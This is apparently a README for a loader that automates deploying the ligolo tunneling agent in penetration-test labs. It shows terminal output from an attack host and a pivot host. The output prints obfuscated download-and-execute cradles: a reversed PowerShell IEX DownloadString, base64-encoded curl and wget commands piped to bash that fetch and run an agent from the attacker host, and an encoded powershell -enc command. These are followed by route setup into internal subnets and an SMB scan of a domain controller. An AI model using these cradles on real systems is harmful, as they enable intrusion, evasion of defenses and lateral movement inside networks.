# ligolo
This is not ligolo, but a loader for ligolo.  I hate typey typey.

# Installation
```bash
python3 setup.py
```

# Usage
```bash
ligolo
ligolo -web 8000
ligolo -h
usage: ligolo [-h] [-ip IPADDRESS] [-port PROXYPORT] [-path OUTPUT_DIR]
                 [-web WEBPORT]

Script to define variables.

options:
  -h, --help        show this help message and exit
  -ip IPADDRESS     Override IPADDRESS
  -port PROXYPORT   Override PROXYPORT
  -path OUTPUT_DIR  Override OUTPUT_DIR
  -web WEBPORT      Override WEBPORT
```

# Example
from attack host
```bash
┌─[us-dedicated-217-dhcp]─[10.10.14.3]─[dockrmanhattn@htb-lbwhckc6w2]─[~/ligolo]
└──╼ [★]$ ligolo -web 8000
Ligolo.exe built successfully.
Base Command: IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/ligolo.txt')
Reversed Command: $reversed = ')''txt.ologil/0008:3.41.01.01//:ptth''(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( XEI'.ToCharArray();[array]::Reverse($reversed);-join $reversed | IEX
DoubleHop: agent -connect $pivot:$port -ignore-cert
(curl): echo Y3VybCAtbyAvdG1wL3RtcGJ6IGh0dHA6Ly8xMC4xMC4xNC4zOjgwMDAvYWdlbnQ7IGNobW9kICt4IC90bXAvdG1wYno7IGlwIGEgfCBncmVwIC12ICcxMjcuMC4wLjEnIHwgZ3JlcCAtdiBpbmV0NiB8IGdyZXAgaW5ldCB8IGF3ayAne3ByaW50ICQyfScgfCBzZWQgJ3MvXChcKFswLTldXHsxLDNcfVwuXClcezNcfVwpWzAtOV1cezEsM1x9XC8vXDEwXC8vJyB8IHdoaWxlIHJlYWQgLXIgaTsgZG8gZWNobyAiG1s5M20Kc3VkbyBpcCByb3V0ZSBhZGQgJGkgZGV2IGxpZ29sbxtbMG0iOyBkb25lOyBlY2hvICcbWzM4OzU7MTU4bURvbnQgZm9yZ2V0IHRvIHN0b3AgdGhlIHdlYnNlcnZlciEhG1swbSc7IC90bXAvdG1wYnogLWNvbm5lY3QgMTAuMTAuMTQuMzoxMTYwMSAtaWdub3JlLWNlcnQgJg== | base64 -d | bash
(wget): echo d2dldCAtTyAvdG1wL3RtcGJ6IGh0dHA6Ly8xMC4xMC4xNC4zOjgwMDAvYWdlbnQ7IGNobW9kICt4IC90bXAvdG1wYno7IGlwIGEgfCBncmVwIC12ICcxMjcuMC4wLjEnIHwgZ3JlcCAtdiBpbmV0NiB8IGdyZXAgaW5ldCB8IGF3ayAne3ByaW50ICQyfScgfCBzZWQgJ3MvXChcKFswLTldXHsxLDNcfVwuXClcezNcfVx9WzAtOV1cezEsM1x9XC8vXDEwXC8vJyB8IHdoaWxlIHJlYWQgLXIgaTsgZG8gZWNobyAiG1s5M21zdWRvIGlwIHJvdXRlIGFkZCAkaSBkZXYgbGlnb2xvG1swbSI7IGRvbmU7IGVjaG8gJxtbMzg7NTsxNThtCkRvbnQgZm9yZ2V0IHRvIHN0b3AgdGhlIHdlYnNlcnZlciEhG1swbSc7IC90bXAvdG1wYnogLWNvbm5lY3QgMTAuMTAuMTQuMzoxMTYwMSAtaWdub3JlLWNlcnQgJg== | base64 -d | bash
(powershell): powershell -enc JAByAGUAdgBlAHIAcwBlAGQAIAA9ACAAJwApACcAJwB0AHgAdAAuAG8AbABvAGcAaQBsAC8AMAAwADAAOAA6ADMALgA0ADEALgAwADEALgAwADEALwAvADoAcAB0AHQAaAAnACcAKABnAG4AaQByAHQAUwBkAGEAbwBsAG4AdwBvAEQALgApAHQAbgBlAGkAbABDAGIAZQBXAC4AdABlAE4AIAB0AGMAZQBqAGIATwAtAHcAZQBOACgAIABYAEUASQAnAC4AVABvAEMAaABhAHIAQQByAHIAYQB5ACgAKQA7AFsAYQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAHIAZQB2AGUAcgBzAGUAZAApADsALQBqAG8AaQBuACAAJAByAGUAdgBlAHIAcwBlAGQAIAB8ACAASQBFAFgA
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
from pivot host
```powershell
C:\Users\taino>powershell -enc JAByAGUAdgBlAHIAcwBlAGQAIAA9ACAAJwApACcAJwB0AHgAdAAuAG8AbABvAGcAaQBsAC8AMAAwADAAOAA6ADMALgA0ADEALgAwADEALgAwADEALwAvADoAcAB0AHQAaAAnACcAKABnAG4AaQByAHQAUwBkAGEAbwBsAG4AdwBvAEQALgApAHQAbgBlAGkAbABDAGIAZQBXAC4AdABlAE4AIAB0AGMAZQBqAGIATwAtAHcAZQBOACgAIABYAEUASQAnAC4AVABvAEMAaABhAHIAQQByAHIAYQB5ACgAKQA7AFsAYQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAHIAZQB2AGUAcgBzAGUAZAApADsALQBqAG8AaQBuACAAJAByAGUAdgBlAHIAcwBlAGQAIAB8ACAASQBFAFgA
Now, kill the webserver!
sudo ip route add 10.129.229.0/24 dev ligolo
sudo ip route add 172.19.99.0/24 dev ligolo
I mean it!  DONT FORGET TO KILL THE WEBSERVER!!!
```
from attack host - notice the ^C -killing the web server executes the commands in tmux that need to be after the setup has occurred.
tmux ls - list sessions
tmux a - attach the ligolo session that commands will be put into
```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.229.227 - - [22/Jan/2025 21:36:47] "GET /ligolo.txt HTTP/1.1" 200 -
10.129.229.227 - - [22/Jan/2025 21:36:47] "GET /ligolo.exe HTTP/1.1" 200 -
10.129.229.227 - - [22/Jan/2025 21:36:47] "GET /agent.exe HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
┌─[us-dedicated-217-dhcp]─[10.10.14.3]─[dockrmanhattn@htb-lbwhckc6w2]─[~/ligolo]
└──╼ [★]$ sudo ip route add 172.19.99.0/24 dev ligolo
┌─[us-dedicated-217-dhcp]─[10.10.14.3]─[dockrmanhattn@htb-lbwhckc6w2]─[~/ligolo]
└──╼ [★]$ nxc smb 172.19.99.10
SMB         172.19.99.10    445    DC04             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC04) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
```
